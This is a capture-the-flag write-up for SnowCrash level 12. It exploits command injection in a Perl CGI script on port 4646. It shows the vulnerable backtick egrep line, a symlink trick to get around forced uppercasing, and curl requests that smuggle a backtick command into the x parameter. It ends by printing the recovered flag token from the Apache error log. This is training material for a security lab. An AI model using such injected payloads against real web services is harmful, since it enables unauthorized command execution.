Level 12
========

*	We spawn with a `level12.pl` script
	```console
	level12@SnowCrash:~$ ls -l 
	total 4
	-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
	```
*	When we look at it we can see that in summary it is a CGI script on port `4646` that takes parameters `x` and `y` from an HTTP request , process them and print some output based on the result
	```perl
	# localhost:4646
	```
*	This exerice is similar to `level06` so it shouldn't be too hard
*	The line important for us is this one, which will allow us to execute any command
	```perl
	@output = `egrep "^$xx" /tmp/xd 2>&1`;
	```
*	It is a bit tricky since we need to use this to execute `getflag` but everything wil be uppercased because of this
	```perl
	$xx =~ tr/a-z/A-Z/; 
	```
	The command searches for lines in the file `/tmp/xd` that start with the pattern stored in the variable `$xx` and redirect errors in `stdout`
*	Let's do this :
	```console
	level12@SnowCrash:~$ ln -s /bin/getflag /tmp/GETFLAG
	```
	*	We need nee to use backticks in our curl so that it get executed as shell 
	*	We also need to put a wildcard before our file so that the script ignore the upper case obligation and just take all
*	Now that we now that let's use curl to make the code execute the symbolic link
	*	The result will be stored in apache error log
	```console
	level12@SnowCrash:~$ curl 'localhost:4646?x=`/*/GETFLAG>&2`'
	level12@SnowCrash:~$ tail /var/log/apache2/error.log 
	[Wed Feb 07 12:58:57 2024] [error] [client 127.0.0.1] sh: 1: 
	[Wed Feb 07 12:58:57 2024] [error] [client 127.0.0.1] Syntax error: EOF in backquote substitution
	```
*	Looks like it doesn't work because we need to [encode](https://www.urlencoder.org/) `/*/GETFLAG>&2` the right way
	```console
	level12@SnowCrash:~$ curl 'localhost:4646?x=`%2F%2A%2FGETFLAG%3E%262`'
	level12@SnowCrash:~$ tail /var/log/apache2/error.log
	[error] [client 127.0.0.1] Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
	```